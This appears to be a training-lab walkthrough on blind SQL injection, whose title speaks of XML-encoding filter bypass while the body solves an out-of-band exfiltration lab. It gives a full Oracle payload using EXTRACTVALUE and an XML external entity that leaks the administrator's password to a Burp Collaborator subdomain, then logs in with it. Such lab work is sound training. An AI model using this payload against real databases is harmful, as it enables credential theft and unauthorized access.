# Lab 14: SQL injection with filter bypass via XML encoding

This **lab** contains a **blind SQL injection** vulnerability. The application uses a **tracking cookie** for analytics and performs a **SQL query** containing the value of the submitted cookie.

- The SQL query is executed **asynchronously** and has **no effect** on the application's visible response.
- However, you can trigger **out-of-band interactions** with an external domain.

---

### 📂 **Target Information**

- The database contains a **table** called `users`.
- The `users` table includes the following **columns**:
    - `username`
    - `password`

---

### 🎯 **Objective**

You must exploit the **blind SQL injection vulnerability** to:

1. Discover the **password** of the `administrator` user.
2. **Log in** as the administrator to solve the lab.

---

> Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
> 

> **Hint**
You can find some useful payloads on our SQL injection cheat sheet.
> 

### **Solution**

### 🛠️ **Lab Instructions: Exploiting Blind SQL Injection with Out-of-Band Interaction**

### 🔍 Step 1: Intercept the TrackingId Cookie

- Visit the **front page** of the shop.
- Use **Burp Suite Professional** to intercept and modify the request containing the **`TrackingId`** cookie.

---

### 💉 Step 2: Modify the TrackingId with a Payload

- Change the `TrackingId` cookie to the following payload to leak the administrator’s password using an out-of-band interaction:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

- Right-click and select **"Insert Collaborator payload"** to insert a Burp Collaborator subdomain in place of `BURP-COLLABORATOR-SUBDOMAIN`.

---

### 🌐 Step 3: Monitor Collaborator for Interactions

- Go to the **Collaborator tab** in Burp.
- Click **"Poll now"**.
- If no interactions appear immediately, **wait a few seconds and try again**, as the query executes **asynchronously**.

---

### 📡 Step 4: Analyze the Interaction

- You should see **DNS and HTTP interactions** initiated by the application.
- The **administrator's password** will appear in the **subdomain** of the interaction:
    - For **DNS**: View the full domain in the **Description tab**.
    - For **HTTP**: View the full domain in the **Host header** in the **Request to Collaborator tab**.

---

### 🔑 Step 5: Log In as Administrator

- In the browser, click **"My account"** to open the **login page**.
- Use the **extracted password** to log in as the `administrator` user.

### **Community solutions**

> [https://youtu.be/KOaDan0UqFs](https://youtu.be/KOaDan0UqFs)
>